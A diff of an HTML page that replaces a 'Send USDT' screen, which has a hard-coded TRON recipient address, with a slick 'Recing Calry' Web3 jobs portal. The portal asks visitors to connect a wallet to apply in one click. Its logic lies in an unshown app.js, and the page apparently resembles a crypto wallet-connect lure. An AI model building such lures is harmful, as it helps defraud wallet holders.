@@ -3,79 +3,264 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-  <title>Send USDT</title>
+  <meta name="theme-color" content="#070a14" />
+  <title>Recing Calry - Jobs Portal</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
   <link rel="stylesheet" href="style.css" />
+  <style>
+    :root{
+      --bg:#070a14;--bg2:#0e1322;--bg3:#151b2e;--bd:#1f2740;--tx:#f5f7fb;--tx2:#b6bfd6;
+      --mt:#7a839a;--mt2:#9aa3b8;--bl:#6d5dfc;--bl2:#8b7cff;--gn:#2dd4a4;--rd:#ff5c7a;
+      --card:#12182b;--card2:#1c2338;--accent:#6d5dfc;--glow:rgba(109,93,252,.35);
+    }
+    *{box-sizing:border-box;}
+    button,a,input,select{touch-action:manipulation;}
+    html,body{margin:0;padding:0;}
+    body{font-family:'Inter',-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:var(--bg);color:var(--tx);min-height:100vh;overflow-x:hidden;-webkit-font-smoothing:antialiased;}
+    body::before{content:'';position:fixed;inset:0;z-index:-2;background:
+      radial-gradient(900px 600px at 10% -10%, rgba(109,93,252,.25), transparent 60%),
+      radial-gradient(700px 500px at 90% 10%, rgba(45,212,164,.18), transparent 60%),
+      radial-gradient(800px 600px at 50% 110%, rgba(139,124,255,.15), transparent 60%),
+      var(--bg);}
+    body::after{content:'';position:fixed;inset:0;z-index:-1;pointer-events:none;background-image:linear-gradient(rgba(255,255,255,.02) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.02) 1px,transparent 1px);background-size:48px 48px;mask-image:radial-gradient(ellipse at center,black 40%,transparent 80%);}
+
+    .jp-header{position:fixed;top:0;left:0;right:0;display:flex;justify-content:center;padding:10px 14px;border-bottom:1px solid rgba(255,255,255,.06);background:rgba(7,10,20,.72);backdrop-filter:blur(18px) saturate(140%);-webkit-backdrop-filter:blur(18px) saturate(140%);z-index:60;}
+    .nav-bar{display:flex;align-items:center;justify-content:space-between;gap:10px;width:100%;max-width:480px;flex-wrap:wrap;}
+    .jp-brand{font-size:22px;font-weight:800;letter-spacing:-.5px;background:linear-gradient(135deg,#fff 0%,#b6bfd6 100%);-webkit-background-clip:text;background-clip:text;color:transparent;}
+    .jp-brand span{background:linear-gradient(135deg,var(--bl) 0%,var(--gn) 100%);-webkit-background-clip:text;background-clip:text;color:transparent;}
+    .jp-nav{display:flex;gap:4px;align-items:center;}
+    .jp-nav a{color:var(--mt2);text-decoration:none;font-size:14px;font-weight:500;padding:8px 12px;border-radius:8px;transition:all .2s;}
+    .jp-nav a:hover{color:var(--tx);background:rgba(255,255,255,.05);}
+    .connect-btn{background:linear-gradient(135deg,var(--bl) 0%,var(--bl2) 100%);color:#fff;border:none;border-radius:12px;padding:12px 16px;font-size:14px;font-weight:600;cursor:pointer;transition:all .25s;box-shadow:0 6px 20px var(--glow);position:relative;overflow:hidden;}
+    .connect-btn::after{content:'';position:absolute;inset:0;background:linear-gradient(135deg,rgba(255,255,255,.25),transparent);opacity:0;transition:opacity .25s;}
+    .connect-btn:hover{transform:translateY(-1px);box-shadow:0 10px 28px var(--glow);}
+    .connect-btn:hover::after{opacity:1;}
+    .connect-btn.connected{background:linear-gradient(135deg,var(--gn) 0%,#1fa880 100%);box-shadow:0 6px 20px rgba(45,212,164,.35);}
+    .jp-main{max-width:480px;margin:0 auto;padding:100px 16px 20px;text-align:center;}
+    .hero{padding:40px 0 32px;text-align:center;position:relative;}
+    .hero-badge{display:inline-flex;align-items:center;gap:8px;padding:6px 14px;border-radius:999px;background:rgba(109,93,252,.12);border:1px solid rgba(109,93,252,.3);color:var(--bl2);font-size:12px;font-weight:600;margin-bottom:18px;}
+    .hero-badge .dot{width:6px;height:6px;border-radius:50%;background:var(--gn);box-shadow:0 0 8px var(--gn);animation:pulse 1.6s ease-in-out infinite;}
+    @keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.5;transform:scale(1.4)}}
+    .hero h1{font-size:clamp(32px,5vw,56px);font-weight:800;margin:0 0 14px;letter-spacing:-1.5px;line-height:1.05;background:linear-gradient(135deg,#fff 0%,#b6bfd6 50%,var(--bl2) 100%);-webkit-background-clip:text;background-clip:text;color:transparent;}
+    .hero p{color:var(--mt2);font-size:17px;max-width:640px;margin:0 auto;line-height:1.6;}
+    .stats-row{display:flex;gap:24px;justify-content:center;margin-top:28px;flex-wrap:wrap;}
+    .stat{display:flex;flex-direction:column;align-items:center;}
+    .stat-v{font-size:22px;font-weight:800;color:var(--tx);}
+    .stat-l{font-size:12px;color:var(--mt);margin-top:2px;}
+    .filters{display:flex;flex-direction:column;gap:8px;margin:18px 0 20px;padding:10px;background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.06);border-radius:16px;backdrop-filter:blur(10px);}
+    .search-wrap{flex:2;min-width:220px;position:relative;display:flex;align-items:center;}
+    .search-wrap svg{position:absolute;left:14px;color:var(--mt);pointer-events:none;}
+    .filters input,.filters select{background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08);color:var(--tx);border-radius:12px;padding:12px 14px 12px 42px;font-size:14px;flex:1;min-width:0;transition:all .2s;font-family:inherit;}
+    .filters select{padding-left:14px;cursor:pointer;color-scheme:dark;appearance:none;-webkit-appearance:none;background-color:rgba(255,255,255,.06);background-image:url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='16' height='16' fill='none' stroke='%239aa3b8' stroke-width='2' stroke-linecap='round'><polyline points='4 6 8 10 12 6'/></svg>");background-repeat:no-repeat;background-position:right 14px center;padding-right:38px;}
+    .filters select option{background:#0e1322;color:#f5f7fb;}
+    .filters input:focus,.filters select:focus{outline:none;border-color:var(--bl);background:rgba(109,93,252,.06);box-shadow:0 0 0 3px rgba(109,93,252,.15);}
+    .filters input::placeholder{color:var(--mt);}
+    .jobs{display:grid;grid-template-columns:1fr;gap:12px;}
+    .job-card{background:linear-gradient(180deg,rgba(255,255,255,.05) 0%,rgba(255,255,255,.015) 100%);border:1px solid rgba(255,255,255,.09);border-radius:20px;padding:24px 20px 20px;display:flex;flex-direction:column;gap:14px;transition:transform .35s cubic-bezier(.2,.8,.2,1),border-color .35s,box-shadow .35s;position:relative;overflow:hidden;animation:fadeUp .5s ease both;text-align:center;box-shadow:0 8px 24px rgba(0,0,0,.2);}
+    .job-card::after{content:'';position:absolute;top:0;left:0;right:0;height:3px;background:linear-gradient(90deg,transparent,var(--bl),var(--gn),transparent);opacity:.6;transition:opacity .3s;}
+    .job-card:hover::after{opacity:1;}
+    .job-card::before{content:'';position:absolute;inset:0;background:radial-gradient(400px 200px at var(--mx,50%) var(--my,0%),rgba(109,93,252,.12),transparent 60%);opacity:0;transition:opacity .3s;pointer-events:none;}
+    .job-card:hover{transform:translateY(-4px);border-color:rgba(109,93,252,.4);box-shadow:0 18px 40px rgba(0,0,0,.35),0 0 0 1px rgba(109,93,252,.2);}
+    .job-card:hover::before{opacity:1;}
+    @keyframes fadeUp{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:translateY(0)}}
+    .job-top{display:flex;flex-direction:column;align-items:center;gap:8px;}
+    .job-icon{width:56px;height:56px;border-radius:16px;background:linear-gradient(135deg,var(--bl) 0%,var(--bl2) 60%,var(--gn) 100%);display:flex;align-items:center;justify-content:center;font-weight:800;font-size:22px;color:#fff;flex-shrink:0;box-shadow:0 8px 22px rgba(109,93,252,.35);position:relative;overflow:hidden;}
+    .job-meta{flex:1;min-width:0;}
+    .job-title{font-size:18px;font-weight:700;margin:0 0 6px;letter-spacing:-.3px;}
+    .job-company{font-size:13px;color:var(--mt2);display:flex;align-items:center;justify-content:center;gap:6px;flex-wrap:wrap;}
+    .job-salary{font-size:16px;font-weight:700;background:linear-gradient(135deg,var(--gn),#1fa880);-webkit-background-clip:text;background-clip:text;color:transparent;white-space:nowrap;}
+    .job-tags{display:flex;flex-wrap:wrap;gap:6px;justify-content:center;}
+    .tag{font-size:11px;font-weight:600;padding:5px 11px;border-radius:999px;background:rgba(109,93,252,.12);color:var(--bl2);border:1px solid rgba(109,93,252,.22);transition:all .2s;}
+    .job-card:hover .tag{background:rgba(109,93,252,.18);}
+    .job-footer{display:flex;align-items:center;justify-content:center;gap:10px;margin-top:auto;padding-top:12px;border-top:1px solid rgba(255,255,255,.06);flex-wrap:wrap;}
+    .job-type{font-size:11px;font-weight:700;color:var(--gn);background:rgba(45,212,164,.1);padding:5px 12px;border-radius:999px;border:1px solid rgba(45,212,164,.22);text-transform:uppercase;letter-spacing:.5px;}
+    .job-posted{font-size:12px;color:var(--mt);flex:1;}
+    .apply-btn{background:linear-gradient(135deg,var(--bl),var(--bl2));color:#fff;border:none;border-radius:12px;padding:12px;font-size:14px;font-weight:700;cursor:pointer;transition:all .25s;box-shadow:0 6px 16px rgba(109,93,252,.3);width:100%;display:flex;align-items:center;justify-content:center;gap:8px;letter-spacing:.2px;}
+    .apply-btn:hover:not(:disabled){transform:translateY(-1px);box-shadow:0 6px 16px rgba(109,93,252,.4);}
+    .apply-btn:disabled{background:rgba(255,255,255,.06);color:var(--mt);cursor:not-allowed;box-shadow:none;}
+    .empty-msg{grid-column:1/-1;text-align:center;padding:60px 20px;color:var(--mt);font-size:15px;}
+    .modal{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.6);backdrop-filter:blur(6px);display:flex;align-items:flex-end;justify-content:center;z-index:100;padding:0;animation:fadeIn .2s ease;}
+    .modal.hidden{display:none;}
+    @keyframes fadeIn{from{opacity:0}to{opacity:1}}
+    .modal-box{background:linear-gradient(180deg,#12182b,#0e1322);border:1px solid rgba(255,255,255,.1);border-radius:20px 20px 0 0;width:100%;max-width:480px;max-height:94vh;overflow-y:auto;-webkit-overflow-scrolling:touch;box-shadow:0 30px 80px rgba(0,0,0,.6);animation:pop .3s cubic-bezier(.2,.8,.2,1);}
+    @keyframes pop{from{opacity:0;transform:scale(.94) translateY(10px)}to{opacity:1;transform:scale(1) translateY(0)}}
+    .modal-top{display:flex;justify-content:space-between;align-items:center;padding:18px 22px;border-bottom:1px solid rgba(255,255,255,.06);text-align:center;}
+    .modal-h{font-size:18px;font-weight:700;}
+    .modal-x{background:rgba(255,255,255,.05);border:none;color:var(--tx);font-size:20px;cursor:pointer;padding:0;width:32px;height:32px;border-radius:8px;display:flex;align-items:center;justify-content:center;transition:background .2s;}
+    .modal-x:hover{background:rgba(255,255,255,.1);}
+    .modal-body{padding:8px 22px;text-align:center;}
+    .mrow{display:flex;flex-direction:column;align-items:center;padding:12px 0;border-bottom:1px solid rgba(255,255,255,.06);font-size:14px;gap:4px;}
+    .mrow:last-child{border-bottom:none;}
+    .ml{color:var(--mt);font-weight:500;}
+    .mv{text-align:center;word-break:break-all;max-width:100%;color:var(--tx);font-weight:500;}
+    .mv.ok{color:var(--gn);}
+    .modal-actions{display:flex;flex-direction:column;align-items:center;gap:8px;padding:14px 18px;border-top:1px solid rgba(255,255,255,.06);}
+    .m-btn{width:100%;padding:12px;border:none;border-radius:12px;font-size:14px;font-weight:600;cursor:pointer;transition:all .2s;}
+    .m-btn.primary{background:linear-gradient(135deg,var(--bl),var(--bl2));color:#fff;box-shadow:0 6px 18px rgba(109,93,252,.3);}
+    .m-btn.primary:hover{transform:translateY(-1px);}
+    .m-btn.secondary{background:rgba(255,255,255,.06);color:var(--tx);border:1px solid rgba(255,255,255,.08);}
+    .m-btn:disabled{opacity:.5;cursor:not-allowed;transform:none;}
+    .toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%) translateY(20px);background:linear-gradient(135deg,var(--gn),#1fa880);color:#041a12;padding:13px 22px;border-radius:12px;font-size:14px;font-weight:600;z-index:200;opacity:0;transition:all .3s;pointer-events:none;box-shadow:0 12px 30px rgba(45,212,164,.35);}
+    .toast.show{opacity:1;transform:translateX(-50%) translateY(0);}
+    .footer{text-align:center;padding:40px 20px;color:var(--mt);font-size:13px;border-top:1px solid rgba(255,255,255,.06);margin-top:40px;}
+    .footer .brand{font-weight:700;color:var(--tx2);}
+    .about-card{margin-top:40px;padding:28px;background:linear-gradient(180deg,rgba(255,255,255,.04),rgba(255,255,255,.01));border:1px solid rgba(255,255,255,.08);border-radius:18px;}
+    .about-card h2{margin:0 0 8px;font-size:20px;}
+    .about-card p{color:var(--mt2);font-size:14px;line-height:1.7;margin:0;}
+    @media(max-width:640px){
+      .jp-header{padding:10px 14px;}
+      .jp-brand{font-size:20px;}
+      .jp-nav{order:3;width:100%;justify-content:center;gap:4px;}
+      .jp-nav a{font-size:13px;padding:6px 10px;}
+      .connect-btn{width:100%;padding:12px;font-size:15px;}
+      .jp-main{padding:160px 14px 20px;}
+      .hero{padding:16px 0 12px;}
+      .hero-badge{font-size:11px;padding:5px 12px;}
+      .hero h1{font-size:26px;letter-spacing:-1px;}
+      .hero p{font-size:14px;}
+      .stats-row{gap:14px;margin-top:18px;}
+      .stat-v{font-size:18px;}
+      .stat-l{font-size:11px;}
+      .filters{flex-direction:column;padding:10px;gap:8px;margin:18px 0 20px;}
+      .filters input{width:100%;font-size:16px;padding:12px 14px 12px 42px;}
+      .filters select{width:100%;font-size:16px;padding:12px 38px 12px 14px;}
+      .jobs{grid-template-columns:1fr;gap:12px;}
+      .job-card{padding:14px;gap:10px;}
+      .job-icon{width:40px;height:40px;font-size:16px;}
+      .job-title{font-size:15px;}
+      .job-company{font-size:12px;}
+      .job-salary{font-size:14px;}
+      .tag{font-size:10px;padding:4px 8px;}
+      .job-type{font-size:10px;}
+      .job-posted{font-size:11px;}
+      .apply-btn{width:100%;padding:10px;font-size:14px;}
+      .modal{padding:0;align-items:flex-end;}
+      .modal-box{border-radius:20px 20px 0 0;max-height:94vh;width:100%;}
+      .modal-top{padding:16px 18px;}
+      .modal-h{font-size:16px;}
+      .modal-body{padding:6px 18px;}
+      .mrow{font-size:13px;padding:10px 0;}
+      .modal-actions{flex-direction:column;padding:14px 18px;gap:8px;}
+      .m-btn{width:100%;padding:12px;}
+      .about-card{padding:20px;margin-top:24px;}
+      .about-card h2{font-size:18px;}
+      .about-card p{font-size:13px;}
+      .footer{padding:24px 16px;font-size:12px;}
+    }
+    @media(max-width:380px){
+      .jp-brand{font-size:18px;}
+      .hero h1{font-size:22px;}
+      .stat-v{font-size:16px;}
+    }
+    @media(max-width:380px){
+      .jp-brand{font-size:19px;}
+      .hero h1{font-size:26px;}
+    }
+    .k,.apply-btn,.connect-btn,.m-btn,.modal-x{min-height:44px;}
+    /* ===== enhanced beauty ===== */
+    .hero h1{animation:floatY 6s ease-in-out infinite;}
+    @keyframes floatY{0%,100%{transform:translateY(0)}50%{transform:translateY(-6px)}}
+    .hero-badge{animation:glowPulse 3s ease-in-out infinite;}
+    @keyframes glowPulse{0%,100%{box-shadow:0 0 0 rgba(109,93,252,0)}50%{box-shadow:0 0 24px rgba(109,93,252,.35)}}
+    .job-icon{position:relative;}
+    .job-icon::after{content:'';position:absolute;inset:0;border-radius:16px;background:linear-gradient(135deg,rgba(255,255,255,.35),transparent);mix-blend-mode:overlay;}
+    .job-icon img{position:absolute;inset:0;width:100%;height:100%;object-fit:cover;border-radius:16px;background:transparent;}
+    .job-salary{padding:4px 10px;border-radius:8px;background:rgba(45,212,164,.1);border:1px solid rgba(45,212,164,.2);}
+    .job-card{backdrop-filter:blur(8px);}
+    .reveal{opacity:0;transform:translateY(24px);transition:opacity .6s ease,transform .6s cubic-bezier(.2,.8,.2,1);}
+    .reveal.in{opacity:1;transform:translateY(0);}
+    ::-webkit-scrollbar{width:8px;height:8px;}
+    ::-webkit-scrollbar-track{background:rgba(255,255,255,.03);}
+    ::-webkit-scrollbar-thumb{background:rgba(109,93,252,.4);border-radius:8px;}
+    ::-webkit-scrollbar-thumb:hover{background:var(--bl);}
+    ::selection{background:rgba(109,93,252,.4);color:#fff;}
+    .hero p{max-width:560px;}
+    .stats-row .stat-v{background:linear-gradient(135deg,#fff,var(--bl2));-webkit-background-clip:text;background-clip:text;color:transparent;}
+    .section-head{text-align:center;margin:8px 0 16px;}
+    .section-head h2{font-size:20px;margin:0 0 4px;}
+    .section-head span{font-size:13px;color:var(--mt);}
+    a,button{-webkit-tap-highlight-color:transparent;}
+    .connect-btn:active{transform:scale(.97);}
+    .apply-btn:active:not(:disabled){transform:scale(.97);}
+  </style>
 </head>
 <body>
-  <div class="app" id="app">
-
-    <!-- Header -->
-    <div class="hdr slide" data-s="0">
-      <div class="hdr-title">Amount</div>
+  <header class="jp-header">
+    <div class="nav-bar">
+      <div class="jp-brand">Recing <span>Calry</span></div>
+      <nav class="jp-nav">
+        <a href="#jobs">Jobs</a>
+        <a href="#about">About</a>
+      </nav>
+      <button id="connectBtn" class="connect-btn" onclick="connectWallet()">Connect Wallet</button>
     </div>
+  </header>
 
-    <!-- To -->
-    <div class="to slide" data-s="1">
-      <span class="to-label">To:</span>
-      <span class="to-addr">TLFD53gg5uraFeKMsLs8m9ZT1cpX6JFDHo</span>
-    </div>
-
-    <!-- Amount -->
-    <div class="amount-wrap slide" data-s="2">
-      <div class="amount" id="amount">0</div>
-      <div class="usd-line">≈ $<span id="usd">0.00</span> <span class="swap">↕</span></div>
-    </div>
-
-    <!-- Token Row -->
-    <div class="token-row slide" data-s="3">
-      <div class="token-left">
-        <img class="token-icon" src="https://images.ctfassets.net/clixtyxoaeas/6XVYyRJTjyzUAyWg3CfjcH/c75fb2bac44b2622f15832b63f993162/usdt.png" alt="USDT" width="40" height="40" />
-        <div class="token-info">
-          <div class="token-bal" id="bal">0 USDT</div>
-          <div class="token-usd" id="bal-usd">$0.00</div>
-        </div>
+  <main class="jp-main">
+    <section class="hero" id="home">
+      <div class="hero-badge"><span class="dot"></span> Now hiring across Web3</div>
+      <h1>Build the future with Recing Calry</h1>
+      <p>Discover roles across engineering, design, marketing and operations. Connect your wallet to apply in one click — no forms, no passwords.</p>
+      <div class="stats-row">
+        <div class="stat"><span class="stat-v" id="statJobs">0</span><span class="stat-l">Open roles</span></div>
+        <div class="stat"><span class="stat-v">8</span><span class="stat-l">Departments</span></div>
+        <div class="stat"><span class="stat-v">100%</span><span class="stat-l">Remote-friendly</span></div>
       </div>
-      <button class="max-btn" onclick="setMax()">Max</button>
-    </div>
+    </section>
 
-    <!-- Numpad -->
-    <div class="numpad slide" data-s="4">
-      <button class="k" onclick="tap('1')">1</button>
-      <button class="k" onclick="tap('2')">2</button>
-      <button class="k" onclick="tap('3')">3</button>
-      <button class="k" onclick="tap('4')">4</button>
-      <button class="k" onclick="tap('5')">5</button>
-      <button class="k" onclick="tap('6')">6</button>
-      <button class="k" onclick="tap('7')">7</button>
-      <button class="k" onclick="tap('8')">8</button>
-      <button class="k" onclick="tap('9')">9</button>
-      <button class="k" onclick="tap('.')">.</button>
-      <button class="k" onclick="tap('0')">0</button>
-      <button class="k kd" onclick="back()">
-        <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#8a91a0" stroke-width="2" stroke-linecap="round"><path d="M21 4H8l-7 8 7 8h13a2 2 0 002-2V6a2 2 0 00-2-2z"/><line x1="18" y1="9" x2="12" y2="15"/><line x1="12" y1="9" x2="18" y2="15"/></svg>
-      </button>
-    </div>
+    <section class="filters">
+      <div class="search-wrap">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
+        <input id="search" type="text" placeholder="Search jobs, companies, skills..." oninput="renderJobs()" />
+      </div>
+      <select id="category" onchange="renderJobs()">
+        <option value="">All Categories</option>
+        <option value="Engineering">Engineering</option>
+        <option value="Design">Design</option>
+        <option value="Marketing">Marketing</option>
+        <option value="Operations">Operations</option>
+      </select>
+      <select id="type" onchange="renderJobs()">
+        <option value="">All Types</option>
+        <option value="Full-time">Full-time</option>
+        <option value="Part-time">Part-time</option>
+        <option value="Contract">Contract</option>
+        <option value="Remote">Remote</option>
+      </select>
+    </section>
 
-    <!-- Send Button -->
-    <div class="bottom slide" data-s="5">
-      <button class="send-btn" id="sendBtn" onclick="go()">Send</button>
-      <div class="status" id="st"></div>
-    </div>
+    <section class="jobs" id="jobs"></section>
 
-    <!-- Success Overlay -->
-    <div class="ok" id="ok" style="display:none">
-      <div class="ok-card">
-        <svg class="ok-icon" width="64" height="64" viewBox="0 0 64 64"><circle cx="32" cy="32" r="32" fill="#34d399"/><path d="M20 32l8 8 16-16" stroke="#fff" stroke-width="4" fill="none" stroke-linecap="round"/></svg>
-        <div class="ok-title">Sent!</div>
-        <div class="ok-amt" id="ok-amt">0 USDT</div>
-        <div class="ok-to">TLFD53...DHo</div>
-        <div class="ok-tx" id="ok-tx"></div>
-        <button class="ok-btn" onclick="reset()">Done</button>
+    <section id="about" class="about-card">
+      <h2>About Recing Calry</h2>
+      <p>Recing Calry is a Web3-native talent marketplace. All applications are tied to your wallet address, making hiring transparent and verifiable on-chain. Connect your wallet to get started.</p>
+    </section>
+  </main>
+
+  <footer class="footer">© 2026 <span class="brand">Recing Calry</span>. Connect your wallet to get started.</footer>
+
+  <div id="applyModal" class="modal hidden">
+    <div class="modal-box">
+      <div class="modal-top">
+        <div class="modal-h">Apply for <span id="applyJobTitle"></span></div>
+        <button class="modal-x" onclick="closeApply()">×</button>
+      </div>
+      <div class="modal-body">
+        <div class="mrow"><span class="ml">Company</span><span class="mv" id="applyCompany"></span></div>
+        <div class="mrow"><span class="ml">Your Wallet</span><span class="mv" id="applyWallet">Not connected</span></div>
+        <div class="mrow"><span class="ml">Status</span><span class="mv" id="applyStatus">Ready to submit</span></div>
+      </div>
+      <div class="modal-actions">
+        <button class="m-btn secondary" onclick="closeApply()">Cancel</button>
+        <button class="m-btn primary" id="submitApplyBtn" onclick="submitApply()">Submit Application</button>
       </div>
     </div>
-
   </div>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/tronweb/4.7.0/TronWeb.js"></script>
+
+  <div id="toast" class="toast"></div>
+
   <script src="app.js"></script>
 </body>
 </html>
